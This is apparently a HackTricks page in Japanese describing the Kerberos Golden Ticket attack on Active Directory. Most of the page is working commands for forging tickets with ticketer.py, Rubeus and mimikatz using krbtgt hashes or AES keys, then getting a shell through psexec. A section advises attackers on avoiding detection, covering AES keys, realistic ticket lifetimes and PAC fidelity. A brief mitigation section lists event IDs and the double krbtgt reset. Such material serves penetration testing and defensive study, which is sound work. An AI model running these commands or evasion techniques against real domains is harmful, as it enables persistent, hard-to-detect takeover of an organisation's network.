# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

**Golden Ticket** attackは、**Active Directory (AD) krbtgt accountのNTLM hash**を使用して、**任意のユーザーになりすました正規のTicket Granting Ticket (TGT)を作成**する攻撃です。このtechniqueは、なりすましたユーザーとしてドメイン内の**任意のserviceまたはmachineへのアクセスを可能にする**ため、特に有効です。**krbtgt accountのcredentialsは自動的に更新されることがない**点を覚えておくことが重要です。<sup>[[1]](#references)</sup>

krbtgt accountの**NTLM hashを取得**するには、さまざまな方法を利用できます。ドメイン内の任意のDomain Controller (DC)にある**Local Security Authority Subsystem Service (LSASS) process**または**NT Directory Services (NTDS.dit) file**から抽出できます。さらに、**DCsync attackを実行する**こともこのNTLM hashを取得する方法の1つであり、Mimikatzの**lsadump::dcsync module**や、Impacketの**secretsdump.py script**などのtoolsを使用して実行できます。これらの操作を行うには、通常、**domain admin privilegesまたは同等レベルのaccessが必要**であることを強調しておきます。<sup>[[2]](#references)</sup>

NTLM hashはこの目的に使用できますが、operational security上の理由から、**Advanced Encryption Standard (AES) Kerberos keys (AES128およびAES256)を使用してticketsをforgeする**ことが**強く推奨されます**。これはmodern domainsではさらに重要です。**RC4の使用は段階的に廃止されており**、Kerberos telemetry上でより明確に目立つためです。<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Modern ticket craftingに関する注意事項

可能な場合は、まず **LDAPとSYSVOLをquery** し、手動で値を考案するのではなく、実際のドメインポリシーとユーザーのPAC値を使用してticketをforgeします。<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` は、より現実的な PAC の構築に使用されるユーザー、グループ、NetBIOS、ポリシーのデータを DC に問い合わせます。
- `/printcmd` は、取得した PAC フィールドを含む offline command line を出力します。後で LDAP に再度アクセスせずに同じ ticket を forge したい場合に便利です。
- `/extendedupndns` は、`samAccountName` とアカウント SID を含む新しい `UpnDns` PAC 要素を追加します。
- `/oldpac` は、新しい `Requestor` および `Attributes` PAC バッファを削除します。これは主に、古い環境との compatibility testing に役立つものであり、デフォルトの tradecraft で使用するものではありません。

Linux からは、最近の Impacket versions でも、新しい PAC structures の追加と現実的な validity period の設定がサポートされています。
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` は**時間単位**です。デフォルトは**10年**で、ノイズが多くなります。
- `-extra-pac` は新しい `UPN_DNS` PAC 情報を追加します。
- `-old-pac` は legacy PAC レイアウトを強制します。
- `-extra-sid` は、PAC に追加の SID が必要な場合に便利です（たとえば、[SID-History Injection](sid-history-injection.md) で扱う child から parent へのエスカレーションシナリオなど）。

**golden Ticket を注入した後**は、共有ファイル **(C$)** にアクセスし、services と WMI を実行できるため、**psexec** または **wmiexec** を使用して shell を取得できます（winrm 経由では shell を取得できないようです）。

### 一般的な検知の回避

golden ticket を検知する最も一般的な方法は、wire 上の **Kerberos traffic** を**調査すること**です。デフォルトでは、Mimikatz は **TGT に10年間の署名を付ける**ため、それを使って後続の TGS requests を行うと異常として目立ちます。

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

`/startoffset`、`/endin`、`/renewmax` パラメータを使用して、開始 offset、duration、最大 renewals（すべて分単位）を制御します。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
残念ながら、TGT の有効期間は 4769 には記録されないため、この情報を Windows event logs から見つけることはできません。ただし、相関できるのは、**事前に 4768 がない状態で 4769 が確認されること**です。**TGT なしで TGS を要求することは不可能**であり、TGT が発行された記録が存在しない場合は、オフラインで forged されたと推測できます。

**新しい Windows builds** では、Event IDs **4768** と **4769** から、より詳細な **encryption type telemetry** も取得できます。`krbtgt`、clients、services がすでに AES keys を持つ domain で、**RC4 (`0x17`)** を使用する forged TGT/TGS は、数年前よりもはるかに検出しやすくなっています。これは、**AES-backed Golden Tickets** を優先し、domain の通常の Kerberos policy に可能な限り合わせるべき理由の1つです。

もう1つの OPSEC 上の問題は、**PAC fidelity** です。存在し得ない group memberships、新しい PAC buffers の欠落、または LDAP と一致しない account metadata を持つ tickets は、defenders が PAC contents を AD data と照合した際に検出されやすくなります。本当に DC によって発行されたように見える TGT が必要な場合は、以下を確認してください。

{{#ref}}
diamond-ticket.md
{{#endref}}

persistence には **environmental limits** もあります。`krbtgt` account は **password history を 2 つ保持**するため、previous key で署名された forged TGT は、**最初の `krbtgt` reset** 後も有効なままになる可能性があります。このため、defenders は **`krbtgt` を2回 reset** し、reset 間に少なくとも domain の maximum ticket lifetime 以上待機することで Golden Tickets を無効化します。<sup>[[3]](#references)</sup>

この **detection** を **bypass** するには diamond tickets を確認してください。

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

defenders が行えるその他の小さな tricks としては、default domain administrator account などの sensitive users に対する 4769 を **alert** し、通常 AES tickets を発行する domains での `krbtgt` に対する **RC4 usage** を **alert** する方法があります。<sup>[[5]](#references)</sup>

## References

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
